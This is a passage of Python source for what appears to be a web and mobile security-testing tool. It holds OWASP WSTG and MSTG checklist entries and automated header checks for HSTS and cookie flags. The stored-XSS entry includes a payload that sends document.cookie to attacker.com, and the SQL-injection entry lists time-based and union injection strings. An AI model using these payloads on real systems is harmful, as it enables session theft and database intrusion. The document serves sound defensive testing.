1. Identify storage points: Find where data is saved and displayed
2. Submit XSS payloads: Use various JavaScript injection techniques
3. Verify persistence: Check if payload survives page reload
4. Test different user contexts: Admin vs regular user views
5. Check all locations where stored data appears

▼ High-Impact Locations:
• User profiles viewed by administrators
• Comment systems on popular pages
• Shared documents or collaborative features
• Email templates or notification systems
• Error logs viewed by administrators

▼ Advanced Payloads:
• <script>fetch("/admin").then(r=>r.text()).then(d=>alert(d))</script>
• <img src=x onerror="new Image().src='//attacker.com/'+document.cookie">
• <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
• Polyglot payloads that work in multiple contexts

▼ Testing Strategy:
• Test with different user roles and privileges
• Check if XSS executes for other users viewing the content
• Verify payload survives data processing and transformations
• Test character limits and input validation bypasses'''
            },
            {
                'id': 'WSTG-INPV-05',
                'title': 'Testing for SQL Injection',
                'category': 'Input Validation Testing',
                'description': '''Test for SQL injection vulnerabilities in database query parameters.

▼ What to Test:
• Form inputs that interact with database
• URL parameters used in database queries
• HTTP headers processed by database queries
• Cookie values used in SQL statements

▼ How to Test:
1. Identify injection points: Find parameters that query database
2. Test basic payloads: Single quotes, error-based injection
3. Boolean-based testing: true/false conditions
4. Time-based testing: Use database sleep functions
5. Union-based testing: Extract data using UNION SELECT

▼ Basic Test Payloads:
• ' (single quote) - Check for SQL errors
• ' OR '1'='1 - Boolean-based testing
• '; WAITFOR DELAY '00:00:05'-- - Time-based (SQL Server)
• ' UNION SELECT null,null,null-- - Union-based
• ' AND 1=1-- vs ' AND 1=2-- - Boolean comparison

▼ Database-Specific Payloads:
• MySQL: ' AND SLEEP(5)--
• PostgreSQL: '; SELECT pg_sleep(5)--
• Oracle: ' AND DBMS_LOCK.SLEEP(5)=1--
• SQLite: ' AND 1=RANDOMBLOB(100000000)--

▼ Detection Methods:
• Error messages revealing database structure
• Different response times indicating time-based injection
• Different page content for true/false conditions
• HTTP status code variations
• Database version and structure information extraction

▼ Tools for Testing:
• SQLmap for automated testing
• Burp Suite SQL injection scanner
• Manual testing with custom payloads
• OWASP ZAP active scanner'''
            },
            {
                'id': 'WSTG-ERRH-01',
                'title': 'Testing for Improper Error Handling',
                'category': 'Error Handling',
                'description': '''Verify that error messages do not disclose sensitive information about the application.

▼ What to Test:
• Stack traces in error messages
• Database error messages revealing schema information
• File path disclosures in error responses
• Debug information in production environment

▼ How to Test:
1. Trigger application errors: Send malformed input, invalid requests
2. Test file inclusion errors: Request non-existent files
3. Database errors: Send SQL injection attempts to trigger DB errors
4. Test different error scenarios: 404, 500, input validation errors
5. Check custom vs default error pages

▼ Error Scenarios to Test:
• Invalid file paths: /app/nonexistent.php
• Malformed SQL: ' in form fields
• Invalid file types: Upload .exe to image upload
• Buffer overflow attempts: Very long input strings
• Special characters in unexpected places

▼ Information Disclosure Risks:
• Full file paths: C:\\inetpub\\wwwroot\\app\\config.php
• Database schema: Table 'users' doesn't exist
• Framework details: ASP.NET stack traces
• Internal IP addresses and server names
• Source code snippets in error messages

▼ Testing Tools:
• Burp Suite error detection
• OWASP ZAP error scanner
• Manual testing with invalid inputs
• Custom scripts to trigger specific errors'''
            },
            {
                'id': 'WSTG-CRYP-01',
                'title': 'Testing for Weak SSL/TLS Ciphers',
                'category': 'Cryptography',
                'description': '''Test for weak cryptographic implementations and insecure SSL/TLS configurations.

▼ What to Test:
• Supported SSL/TLS protocol versions
• Cipher suites and their strength
• Certificate validation and trust chain
• Perfect Forward Secrecy (PFS) support

▼ How to Test:
1. SSL/TLS scanning: Use nmap, SSLyze, testssl.sh
2. Check protocols: Verify SSLv2/v3 and weak TLS are disabled
3. Cipher analysis: Test for weak and strong cipher suites
4. Certificate testing: Verify validity, chain, and algorithms
5. Perfect Forward Secrecy: Check for ECDHE/DHE key exchange

▼ Tools for SSL Testing:
• nmap --script ssl-enum-ciphers -p 443 target
• testssl.sh target.com
• SSLyze --regular target.com:443
• Qualys SSL Labs online test
• OpenSSL command line testing

▼ Weak Configurations to Check:
• SSLv2/SSLv3 protocols (should be disabled)
• RC4, DES, 3DES ciphers (weak encryption)
• MD5 and SHA1 certificates (weak hashing)
• Anonymous cipher suites (no authentication)
• Export-grade ciphers (deliberately weakened)

▼ Strong Configuration Requirements:
• TLS 1.2 or 1.3 minimum
• AES-GCM or ChaCha20-Poly1305 ciphers
• ECDHE or DHE key exchange (PFS)
• SHA-256 or better certificate signatures
• Proper certificate chain validation

▼ Common Vulnerabilities:
• POODLE (SSLv3 padding oracle)
• BEAST (CBC cipher vulnerability)
• CRIME/BREACH (compression attacks)
• Heartbleed (OpenSSL vulnerability)
• Logjam (weak Diffie-Hellman)'''
            }
        ]

    @staticmethod
    def _get_fallback_mstg_data():
        """Enhanced fallback MSTG data as backup"""
        return [
            {
                'id': 'MSTG-ARCH-1',
                'title': 'All app components are identified and known to be needed',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': '''Verify that all application components are identified, necessary, and that unused components are removed.

▼ What to Review:
• Application architecture documentation
• Third-party libraries and dependencies
• Unused code and dead functionality
• Development/debug components in production builds

▼ How to Test:
1. Code review: Analyze source code for unused imports and functions
2. Dependency analysis: Check package.json, Podfile, build.gradle
3. Binary analysis: Use tools to identify included libraries
4. Network analysis: Monitor app traffic to identify service calls
5. Static analysis: Use tools to detect dead code

▼ Mobile-Specific Checks:
• iOS: Check Info.plist for URL schemes and permissions
• Android: Review AndroidManifest.xml for components and permissions
• Verify only necessary permissions are requested
• Check for development certificates in production builds

▼ Tools for Analysis:
• iOS: otool, class-dump, Hopper Disassembler
• Android: APKTool, jadx, MobSF
• Static analysis: SonarQube, Checkmarx
• Dependency checking: OWASP Dependency Check'''
            },
            {
                'id': 'MSTG-ARCH-2',
                'title': 'Security controls are never enforced only on the client side',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': '''Ensure that security controls are enforced on a trusted remote endpoint and not solely on the client.

▼ What to Test:
• Authentication logic on client vs server
• Authorization checks and business logic validation
• Input validation and sanitization
• Cryptographic operations and key management

▼ How to Test:
1. Traffic interception: Use proxy tools to modify requests
2. Client-side bypass: Modify app behavior through debugging
3. API testing: Call backend APIs directly bypassing client
4. Business logic testing: Test critical operations through API
5. Authorization testing: Attempt privilege escalation

▼ Common Client-Side Only Issues:
• Authentication tokens validated only on client
• Price calculations done entirely in mobile app
• User role/permission checks only in UI
• Sensitive business logic implemented in client code
• Cryptographic keys hardcoded in the application

▼ Testing Approach:
• Intercept and modify all client-server communications
• Test if server validates all client inputs and requests
• Verify server-side authentication and authorization
• Check if bypassing client controls affects security
• Test edge cases and boundary conditions'''
            },
            {
                'id': 'MSTG-ARCH-3',
                'title': 'A high-level architecture has been defined and security has been addressed',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': '''Verify that a high-level architecture has been defined for the mobile app and all remote services.

▼ What to Review:
• Architecture diagrams and documentation
• Data flow diagrams showing sensitive data handling
• Trust boundaries and security controls
• Threat modeling and risk assessment documentation

▼ How to Test:
1. Documentation review: Check for architecture and security docs
2. Threat model validation: Verify threats have been identified
3. Security control mapping: Check controls address identified threats
4. Data flow analysis: Map sensitive data through the system
5. Attack surface analysis: Identify potential entry points

▼ Architecture Security Elements:
• Clear definition of trust boundaries
• Identification of sensitive data and assets
• Security controls at appropriate layers
• Secure communication protocols defined
• Key management and cryptographic architecture

▼ Documentation to Request:
• High-level architecture diagrams
• Threat modeling documentation
• Security requirements and controls
• Data classification and handling procedures
• Incident response and monitoring plans'''
            },
            {
                'id': 'MSTG-STORAGE-1',
                'title': 'System credential storage facilities are used appropriately',
                'category': 'Data Storage and Privacy Requirements',
                'description': '''Verify that system credential storage facilities are used appropriately to store sensitive data.

▼ What to Test:
• iOS Keychain usage for sensitive data
• Android Keystore/EncryptedSharedPreferences usage
• Proper access controls and protection levels
• Backup and export restrictions

▼ How to Test:
1. Static analysis: Check for proper storage API usage
2. Dynamic analysis: Monitor file system during app usage
3. Backup testing: Check if sensitive data appears in backups
4. Rooted/jailbroken testing: Access credential stores
5. Memory dumps: Check for sensitive data in memory

▼ Proper Storage Mechanisms:
• iOS: Keychain Services for passwords and keys
• Android: EncryptedSharedPreferences, Android Keystore
• Biometric authentication integration
• Hardware-backed security (TEE, Secure Enclave)

▼ Common Mistakes:
• Storing credentials in SharedPreferences (Android)
• Using NSUserDefaults for sensitive data (iOS)
• Hardcoding credentials in source code
• Not using appropriate protection classes
• Allowing credential backup to cloud services

▼ Testing Tools:
• iOS: Keychain-dumper, iMazing, 3uTools
• Android: ADB, sqlite3, shared_prefs analysis
• Frida scripts for runtime analysis
• Mobile security frameworks (MobSF, Needle)'''
            },
            {
                'id': 'MSTG-STORAGE-2',
                'title': 'No sensitive data is stored outside of the app container or system credential storage',
                'category': 'Data Storage and Privacy Requirements',
                'description': '''Ensure that sensitive data is not stored outside the app sandbox or system credential storage.

▼ What to Test:
• Data stored in external storage (SD card, shared directories)
• Information in system logs and crash dumps
• Temporary files and caches containing sensitive data
• Data shared with other applications

▼ How to Test:
1. File system analysis: Check external storage for app data
2. Log analysis: Review system logs for sensitive information
3. Cache inspection: Check temporary files and app caches
4. Memory dumps: Analyze RAM for sensitive data persistence
5. Inter-app communication: Test data sharing mechanisms

▼ Storage Locations to Check:
• Android: /sdcard/, /Android/data/, external cache
• iOS: Documents directory shared via iTunes, tmp directories
• System logs: logcat (Android), Console.app (iOS)
• Crash reports and debug information
• Shared preferences and configuration files

▼ Sensitive Data Types:
• User credentials and session tokens
• Personal information (PII)
• Cryptographic keys and certificates
• Business-critical data and trade secrets
• Location data and usage patterns

▼ Testing Commands:
• Android: adb shell find /sdcard -name "*appname*"
• iOS: Browse app container with tools like iMazing
• Check logs: adb logcat | grep -i password
• Memory analysis: Use Frida or similar tools'''
            },
            {
                'id': 'MSTG-STORAGE-3',
                'title': 'No sensitive data is written to application logs',
                'category': 'Data Storage and Privacy Requirements',
                'description': '''Verify that no sensitive data is written to application logs.

▼ What to Test:
• Application debug logs and console output
• System logs and crash reports
• Third-party logging frameworks
• Error handling and exception logging

▼ How to Test:
1. Log monitoring: Monitor logs during app usage
2. Static analysis: Search source code for logging statements
3. Runtime analysis: Use debugging tools to capture logs
4. Crash testing: Trigger errors and check crash reports
5. Third-party service logs: Check external logging services

▼ Common Logging Issues:
• Passwords and tokens in debug logs
• User input logged without sanitization
• Database queries with sensitive parameters
• Error messages containing sensitive context
• API responses logged in full detail

▼ Log Sources to Check:
• Android: Logcat output, app-specific logs
• iOS: Console.app, Xcode debug output
• Framework logs: Apache Cordova, React Native
• Third-party services: Crashlytics, Bugsnag
• Web view console logs

▼ Testing Approach:
• Enable verbose logging and monitor output
• Trigger error conditions to generate exception logs
• Check for sensitive data in stack traces
• Verify log sanitization and filtering
• Test different log levels and configurations'''
            },
            {
                'id': 'MSTG-CRYPTO-1',
                'title': 'The app does not rely on symmetric cryptography with hardcoded keys',
                'category': 'Cryptography Requirements',
                'description': '''Ensure the app does not rely on symmetric cryptography with hardcoded keys as a sole method of encryption.

▼ What to Test:
• Hardcoded encryption keys in source code or binaries
• Symmetric encryption used without proper key management
• Obfuscated keys that can be easily extracted
• Key derivation from predictable sources

▼ How to Test:
1. Static analysis: Search for hardcoded keys in source code
2. Binary analysis: Look for key patterns in compiled binaries
3. Runtime analysis: Monitor cryptographic operations
4. Reverse engineering: Extract keys from obfuscated code
5. Key derivation testing: Analyze key generation mechanisms

▼ Common Hardcoded Key Issues:
• AES keys embedded as string literals
• Base64 encoded keys in source code
• Keys derived from app version or device identifiers
• Same key used across all app installations
• Keys stored in easily accessible configuration files

▼ Proper Key Management:
• User-derived keys (from passwords/biometrics)
• Server-provided keys with secure exchange
• Hardware-backed key storage (TEE, Secure Enclave)
• Key derivation functions (PBKDF2, scrypt, Argon2)
• Per-user or per-session unique keys

▼ Analysis Tools:
• Strings command to find hardcoded values
• Hopper, IDA Pro for binary analysis
• MobSF for automated static analysis
• Frida for runtime key extraction
• Class-dump for iOS Objective-C analysis'''
            },
            {
                'id': 'MSTG-CRYPTO-2',
                'title': 'The app uses proven implementations of cryptographic primitives',
                'category': 'Cryptography Requirements',
                'description': '''Verify that the app uses proven implementations of cryptographic primitives.

▼ What to Test:
• Use of standard cryptographic libraries
• Custom or home-grown cryptographic implementations
• Weak or deprecated cryptographic algorithms
• Proper usage of cryptographic APIs

▼ How to Test:
1. Library analysis: Identify cryptographic libraries in use
2. Algorithm identification: Check for weak or custom algorithms
3. Implementation review: Verify proper API usage
4. Randomness testing: Check random number generation
5. Protocol analysis: Verify secure protocol implementations

▼ Recommended Libraries:
• iOS: CommonCrypto, Security.framework, CryptoKit
• Android: Android Keystore, Conscrypt, BouncyCastle
• Cross-platform: OpenSSL, libsodium, NaCl
• Avoid: Custom implementations, deprecated libraries

▼ Weak Algorithms to Avoid:
• DES, 3DES (use AES instead)
• MD5, SHA1 for security purposes (use SHA-256+)
• RC4 stream cipher (use ChaCha20 or AES-GCM)
• Custom base64 "encryption"
• Simple XOR ciphers

▼ Proper Implementation Checks:
• Secure random number generation
• Proper initialization vector (IV) usage
• Authentication with encryption (AES-GCM, ChaCha20-Poly1305)
• Constant-time comparison functions
• Proper error handling without information leakage'''
            },
            {
                'id': 'MSTG-AUTH-1',
                'title': 'Authentication is performed at the remote endpoint',
                'category': 'Authentication and Session Management Requirements',
                'description': '''If the app provides users access to a remote service, authentication is performed at the remote endpoint.

▼ What to Test:
• Authentication logic implementation location
• Token validation on server vs client
• Offline authentication capabilities and limitations
• Bypass techniques for client-side authentication

▼ How to Test:
1. Network traffic analysis: Monitor authentication requests
2. Token manipulation: Modify auth tokens and test acceptance
3. Offline testing: Test app behavior without network
4. Server-side validation: Verify tokens are validated server-side
5. Bypass attempts: Try to access resources without proper auth

▼ Server-Side Authentication Elements:
• Username/password validation on server
• Session token generation and management
• Multi-factor authentication processing
• Account lockout and security controls
• Authorization decisions made server-side

▼ Client-Side Issues to Avoid:
• Authentication logic only in mobile app
• Hardcoded credentials for "authentication"
• Client-generated tokens accepted by server
• Offline mode bypassing authentication entirely
• Role-based access control only on client

▼ Testing Approach:
• Intercept and modify authentication requests
• Test if modified/invalid tokens are rejected
• Verify server validates all authentication claims
• Check if auth state persists properly across sessions
• Test authentication bypass techniques'''
            },
            {
                'id': 'MSTG-AUTH-2',
                'title': 'Remote endpoint maintains stateful session management',
                'category': 'Authentication and Session Management Requirements',
                'description': '''Verify that the remote endpoint uses randomly generated access tokens to authenticate client requests.

▼ What to Test:
• Session token randomness and unpredictability
• Token lifecycle management (creation, refresh, revocation)
• Stateful session tracking on server
• Token entropy and collision resistance

▼ How to Test:
1. Token analysis: Collect multiple tokens and analyze patterns
2. Entropy testing: Use statistical tests for randomness
3. Lifecycle testing: Test token creation, refresh, and expiration
4. Concurrent sessions: Test multiple simultaneous sessions
5. Token revocation: Verify tokens can be invalidated

▼ Session Token Requirements:
• Cryptographically random generation
• Sufficient length (minimum 128 bits)
• No predictable patterns or sequences
• Proper expiration and timeout handling
• Secure transmission and storage

▼ Testing Session Management:
• Collect 100+ tokens and analyze for patterns
• Test token expiration and renewal mechanisms
• Verify concurrent session handling
• Check if old tokens are properly invalidated
• Test session fixation vulnerabilities

▼ Tools for Analysis:
• Burp Suite Sequencer for token analysis
• Custom scripts for pattern detection
• Statistical randomness tests
• Session management testing frameworks'''
            },
            {
                'id': 'MSTG-NETWORK-1',
                'title': 'Data is encrypted on the network using TLS',
                'category': 'Network Communication Requirements',
                'description': '''Verify that data is encrypted on the network using TLS with secure cipher suites.

▼ What to Test:
• All network communications use HTTPS/TLS
• TLS version and cipher suite strength
• Certificate validation and pinning
• Mixed content and downgrade attacks

▼ How to Test:
1. Traffic interception: Monitor all app network traffic
2. Protocol analysis: Verify TLS usage for all connections
3. Cipher testing: Check supported cipher suites
4. Certificate testing: Verify proper certificate validation
5. Downgrade testing: Test forced HTTP connections

▼ Network Security Requirements:
• TLS 1.2 or higher for all connections
• Strong cipher suites (AES-GCM, ChaCha20-Poly1305)
• Perfect Forward Secrecy (PFS) support
• Proper certificate chain validation
• Certificate pinning for critical connections

▼ Common Network Issues:
• HTTP connections for sensitive data
• Weak TLS configurations
• Accepting self-signed certificates
• Missing certificate pinning
• Insecure fallback to HTTP

▼ Testing Tools:
• Burp Suite / OWASP ZAP for traffic analysis
• SSLyze for TLS configuration testing
• Nmap for SSL/TLS scanning
• testssl.sh for comprehensive SSL testing
• Mobile-specific tools: MITMProxy, Charles Proxy'''
            },
            {
                'id': 'MSTG-NETWORK-2',
                'title': 'The TLS certificate is properly verified',
                'category': 'Network Communication Requirements',
                'description': '''Ensure that TLS certificates are properly verified and certificate pinning is implemented where appropriate.

▼ What to Test:
• Certificate chain validation
• Hostname verification
• Certificate pinning implementation
• Handling of certificate errors

▼ How to Test:
1. Invalid certificate testing: Use self-signed or expired certificates
2. Hostname mismatch: Test with wrong hostname in certificate
3. Pinning bypass: Test with valid but different certificates
4. Error handling: Check app behavior with certificate errors
5. Proxy testing: Test app through intercepting proxies

▼ Certificate Validation Elements:
• Complete certificate chain verification
• Root CA trust store validation
• Certificate expiration checking
• Hostname/Subject Alternative Name verification
• Certificate revocation checking (OCSP)

▼ Certificate Pinning:
• Pin specific certificates for critical services
• Pin public keys instead of certificates
• Implement backup pins for certificate rotation
• Proper error handling for pinning failures
• Consider certificate transparency monitoring

▼ Testing Scenarios:
• Self-signed certificates should be rejected
• Expired certificates should cause connection failure
• Wrong hostname should trigger validation error
• Pinned connections should fail with different valid certs
• Test certificate pinning bypass techniques'''
            },
            {
                'id': 'MSTG-PLATFORM-1',
                'title': 'App only uses software components without known vulnerabilities',
                'category': 'Platform Interaction Requirements',
                'description': '''Verify that the app only uses software components without known security vulnerabilities.

▼ What to Test:
• Third-party library versions and vulnerability status
• Operating system API usage and deprecation
• Framework and runtime vulnerability exposure
• Dependency chain security assessment

▼ How to Test:
1. Dependency analysis: List all third-party components
2. Vulnerability scanning: Check components against CVE databases
3. Version checking: Verify latest secure versions are used
4. License compliance: Check for license compatibility
5. Supply chain security: Verify component authenticity

▼ Component Analysis:
• Mobile frameworks: React Native, Xamarin, Flutter
• Networking libraries: OkHttp, Alamofire, Retrofit
• Cryptographic libraries: OpenSSL, BouncyCastle
• UI frameworks and third-party SDKs
• Analytics and crash reporting libraries

▼ Vulnerability Assessment:
• Check NIST NVD database for known CVEs
• Use dependency checking tools (OWASP Dependency Check)
• Monitor security advisories for used components
• Implement dependency update policies
• Regular security scanning in CI/CD pipeline

▼ Tools and Resources:
• OWASP Dependency Check
• Snyk vulnerability database
• GitHub Security Advisories
• Node Security Platform (npm audit)
• Sonatype OSS Index'''
            },
            {
                'id': 'MSTG-CODE-1',
                'title': 'The app is signed and provisioned with a valid certificate',
                'category': 'Code Quality and Build Setting Requirements',
                'description': '''Verify that the app is signed and provisioned with a valid certificate.

▼ What to Test:
• Code signing certificate validity and trust chain
• Provisioning profile configuration
• App integrity and tampering detection
• Distribution certificate usage

▼ How to Test:
1. Signature verification: Check code signing status
2. Certificate analysis: Verify certificate chain and validity
3. Provisioning check: Analyze provisioning profile settings
4. Integrity testing: Test app modification detection
5. Distribution validation: Verify proper distribution signing

▼ iOS Code Signing:
• Developer/Distribution certificate validation
• Provisioning profile device/capability restrictions
• Bundle identifier and team identifier verification
• Entitlements and capabilities configuration
• App Store or Enterprise distribution validation

▼ Android Code Signing:
• APK signature scheme validation (v1, v2, v3)
• Certificate validity and expiration
• Debug vs release certificate usage
• Google Play App Signing configuration
• Key rotation and certificate chains

▼ Testing Commands:
• iOS: codesign -dv --verbose=4 App.app
• Android: jarsigner -verify -verbose app.apk
• APK analysis: apksigner verify --verbose app.apk
• Certificate inspection: keytool -printcert -jarfile app.apk'''
            },
            {
                'id': 'MSTG-RESILIENCE-1',
                'title': 'The app detects and responds to jailbroken or rooted devices',
                'category': 'Resilience Against Reverse Engineering Requirements',
                'description': '''Verify that the app detects and responds appropriately to jailbroken or rooted devices.

▼ What to Test:
• Root/jailbreak detection mechanisms
• Detection bypass resistance
• Response to detected compromise
• False positive handling

▼ How to Test:
1. Test on rooted/jailbroken devices: Verify detection works
2. Bypass testing: Use common bypass techniques
3. Response testing: Check app behavior when detection triggers
4. False positive testing: Test on legitimate modified devices
5. Detection robustness: Test multiple detection methods

▼ Detection Techniques:
• File system checks: Look for common root/jailbreak files
• Process inspection: Check for suspicious running processes
• System property analysis: Check build properties and settings
• Behavioral analysis: Monitor system behavior patterns
• Hardware attestation: Use TEE/Secure Enclave features

▼ Common Bypass Methods:
• Frida and other hooking frameworks
• Xposed modules for detection bypass
• Magisk Hide and other root hiding tools
• Runtime manipulation and memory patching
• Emulator and modified firmware detection

▼ Response Strategies:
• Graceful degradation of functionality
• Increased security monitoring and logging
• Limited feature access or data protection
• User notification and education
• Server-side risk assessment integration'''
            }
        ]

    @staticmethod
    def _update_cache(data_type, source, count):
        """Update the cache information"""
        cache_entry = OWASPDataCache.query.filter_by(data_type=data_type).first()
        if cache_entry:
            cache_entry.last_updated = utc_now()
            cache_entry.data_source = source
            cache_entry.test_count = count
        else:
            cache_entry = OWASPDataCache(
                data_type=data_type,
                data_source=source,
                test_count=count
            )
            db.session.add(cache_entry)
        db.session.commit()

    @staticmethod
    def get_cache_info():
        """Get cache information for display"""
        wstg_cache = OWASPDataCache.query.filter_by(data_type='wstg').first()
        mstg_cache = OWASPDataCache.query.filter_by(data_type='mstg').first()
        
        return {
            'wstg': {
                'last_updated': wstg_cache.last_updated if wstg_cache else None,
                'source': wstg_cache.data_source if wstg_cache else 'unknown',
                'count': wstg_cache.test_count if wstg_cache else 0
            },
            'mstg': {
                'last_updated': mstg_cache.last_updated if mstg_cache else None,
                'source': mstg_cache.data_source if mstg_cache else 'unknown',
                'count': mstg_cache.test_count if mstg_cache else 0
            }
        }

    @staticmethod
    def _fetch_wstg_from_checklist():
        """Fetch WSTG data from the official checklist.md file"""
        try:
            # Use the raw GitHub URL to avoid API rate limits
            checklist_url = "https://raw.githubusercontent.com/OWASP/wstg/master/checklists/checklist.md"
            response = requests.get(checklist_url, timeout=30)
            
            if response.status_code != 200:
                print(f"Failed to fetch checklist.md: HTTP {response.status_code}")
                return []
            
            content = response.text
            wstg_tests = []
            
            # Parse the markdown table format
            lines = content.split('\n')
            current_category = ""
            
            for line in lines:
                line = line.strip()
                
                # Skip empty lines and headers
                if not line or line.startswith('#') or line.startswith('|---') or line.startswith('Note:'):
                    continue
                
                # Check for category headers (bold text in table)
                if '**WSTG-' in line and '**' in line:
                    # Extract category name
                    category_match = re.search(r'\*\*(WSTG-[A-Z]+)\*\*\s*\|\s*\*\*([^*]+)\*\*', line)
                    if category_match:
                        current_category = category_match.group(2).strip()
                    continue
                
                # Check for individual test items
                if line.startswith('|') and 'WSTG-' in line and not '**' in line:
                    # Parse table row: | WSTG-ID | Test Name | Status | Notes |
                    parts = [part.strip() for part in line.split('|')]
                    if len(parts) >= 3:
                        wstg_id = parts[1].strip()
                        test_name = parts[2].strip()
                        
                        # Validate WSTG ID format
                        if re.match(r'^WSTG-[A-Z]+-\d+$', wstg_id):
                            # Map category based on ID prefix
                            category_map = {
                                'INFO': 'Information Gathering',
                                'CONF': 'Configuration and Deployment Management Testing',
                                'IDNT': 'Identity Management Testing',
                                'ATHN': 'Authentication Testing',
                                'AUTHZ': 'Authorization Testing',
                                'SESS': 'Session Management Testing',
                                'INPV': 'Input Validation Testing',
                                'ERRH': 'Error Handling',
                                'CRYP': 'Cryptography',
                                'BUSL': 'Business Logic Testing',
                                'CLNT': 'Client-Side Testing',
                                'APIT': 'API Testing'
                            }
                            
                            category_code = wstg_id.split('-')[1] if '-' in wstg_id else 'MISC'
                            category = category_map.get(category_code, current_category or 'Miscellaneous Testing')
                            
                            # Generate description
                            description = f'''Security testing as per OWASP WSTG guidelines for {test_name.lower()}.

▼ What to Test:
• Review the specific functionality related to {test_name.lower()}
• Identify potential security weaknesses in implementation
• Test using both manual and automated approaches
• Verify proper security controls are in place

▼ How to Test:
• Follow OWASP WSTG methodology for this test case
• Use appropriate tools and techniques for the vulnerability type
• Document all testing steps and observations
• Capture evidence of any security issues found

▼ Documentation Required:
• Detailed test steps and methodology
• Screenshots or logs showing evidence
• Risk assessment and potential impact
• Specific remediation recommendations'''
                            
                            wstg_tests.append({
                                'id': wstg_id,
                                'title': test_name,
                                'category': category,
                                'description': description
                            })
            
            print(f"Parsed {len(wstg_tests)} tests from checklist.md")
            return sorted(wstg_tests, key=lambda x: x['id'])
            
        except Exception as e:
            print(f"Error fetching WSTG data from checklist: {e}")
            return []

# Automated Testing Service
class AutoTestService:
    @staticmethod
    def _format_request_details(method, url, headers=None, data=None):
        """Format full HTTP request details"""
        request_lines = [f"{method} {url} HTTP/1.1"]
        
        if headers:
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
        
        request_lines.append("")  # Empty line between headers and body
        
        if data:
            request_lines.append(str(data))
        
        return "\n".join(request_lines)
    
    @staticmethod
    def _format_response_details(response, highlight_headers=None):
        """Format full HTTP response with highlighting"""
        response_lines = [f"HTTP/1.1 {response.status_code} {response.reason}"]
        
        # Add all response headers
        for key, value in response.headers.items():
            if highlight_headers and key in highlight_headers:
                response_lines.append(f">>> {key}: {value} <<<  [HIGHLIGHTED]")
            else:
                response_lines.append(f"{key}: {value}")
        
        response_lines.append("")  # Empty line between headers and body
        
        # Add response body (truncated for readability)
        if response.content:
            content = response.text[:1000] if len(response.text) > 1000 else response.text
            if len(response.text) > 1000:
                content += "\n... [Response truncated]"
            response_lines.append(content)
        
        return "\n".join(response_lines)

    @staticmethod
    def test_hsts(url):
        """Test for HTTP Strict Transport Security"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            hsts_header = response.headers.get('Strict-Transport-Security')
            
            # Format full request and response
            full_request = AutoTestService._format_request_details('GET', url, headers)
            full_response = AutoTestService._format_response_details(response, ['Strict-Transport-Security'])
            
            if hsts_header:
                # Parse HSTS header for better analysis
                max_age = 'Unknown'
                include_subdomains = 'includeSubDomains' in hsts_header
                preload = 'preload' in hsts_header
                
                if 'max-age=' in hsts_header:
                    max_age = hsts_header.split('max-age=')[1].split(';')[0]
                
                evidence = f"✅ HSTS header found: {hsts_header}\n\n"
                evidence += f"📊 Analysis:\n"
                evidence += f"  • Max-Age: {max_age} seconds\n"
                evidence += f"  • Include Subdomains: {'✅ Yes' if include_subdomains else '❌ No'}\n"
                evidence += f"  • Preload: {'✅ Yes' if preload else '❌ No'}\n\n"
                
                if int(max_age) < 31536000:  # Less than 1 year
                    evidence += f"⚠️  Warning: max-age is less than 1 year (31536000 seconds)\n"
                
                return {
                    'result': 'pass',
                    'evidence': evidence,
                    'request': full_request,
                    'response': full_response
                }
            else:
                evidence = f"❌ HSTS header not found\n\n"
                evidence += f"🚨 Security Impact:\n"
                evidence += f"  • Allows protocol downgrade attacks\n"
                evidence += f"  • Man-in-the-middle attacks possible\n"
                evidence += f"  • Users vulnerable to SSL stripping\n\n"
                evidence += f"💡 Recommendation: Add Strict-Transport-Security header"
                
                return {
                    'result': 'fail',
                    'evidence': evidence,
                    'request': full_request,
                    'response': full_response
                }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing HSTS: {str(e)}',
                'request': f'GET {url}',
                'response': 'Request failed - no response received'
            }

    @staticmethod
    def test_cookie_security(url):
        """Test for secure cookie attributes"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            # Get all Set-Cookie headers
            set_cookie_headers = []
            if 'Set-Cookie' in response.headers:
                # Handle multiple Set-Cookie headers
                for key, value in response.headers.items():
                    if key.lower() == 'set-cookie':
                        set_cookie_headers.append(value)
            
            full_request = AutoTestService._format_request_details('GET', url, headers)
            full_response = AutoTestService._format_response_details(response, ['Set-Cookie'])
            
            if not set_cookie_headers:
                return {
                    'result': 'informational',
                    'evidence': 'ℹ️  No cookies set by this endpoint\n\nThis may be expected for static resources or APIs.',
                    'request': full_request,
                    'response': full_response
                }
            
            cookies_analysis = []
            overall_issues = []
            
            for cookie_header in set_cookie_headers:
                if cookie_header:
                    cookie_name = cookie_header.split('=')[0] if '=' in cookie_header else 'Unknown'
                    issues = []
                    security_flags = []
                    
                    if 'HttpOnly' not in cookie_header:
                        issues.append('❌ Missing HttpOnly flag (XSS protection)')
                    else:
                        security_flags.append('✅ HttpOnly')
                        
                    if 'Secure' not in cookie_header:
                        issues.append('❌ Missing Secure flag (HTTPS only)')
                    else:
                        security_flags.append('✅ Secure')
                        
                    if 'SameSite' not in cookie_header:
                        issues.append('❌ Missing SameSite attribute (CSRF protection)')
                    else:
                        # Extract SameSite value
                        samesite_match = re.search(r'SameSite=([^;]+)', cookie_header)
                        samesite_value = samesite_match.group(1) if samesite_match else 'Unknown'
                        security_flags.append(f'✅ SameSite={samesite_value}')
                    
                    cookies_analysis.append({
                        'name': cookie_name,
                        'header': cookie_header,
                        'issues': issues,
                        'security_flags': security_flags
                    })
                    overall_issues.extend(issues)
            
            evidence = f"🍪 Cookie Security Analysis\n\n"
            
            for i, cookie in enumerate(cookies_analysis, 1):
                evidence += f"Cookie {i}: {cookie['name']}\n"
                evidence += f"  Full Header: {cookie['header']}\n"
                
                if cookie['security_flags']:
                    evidence += f"  Security Flags: {', '.join(cookie['security_flags'])}\n"
                
                if cookie['issues']:
                    evidence += f"  Issues Found: {', '.join(cookie['issues'])}\n"
                else:
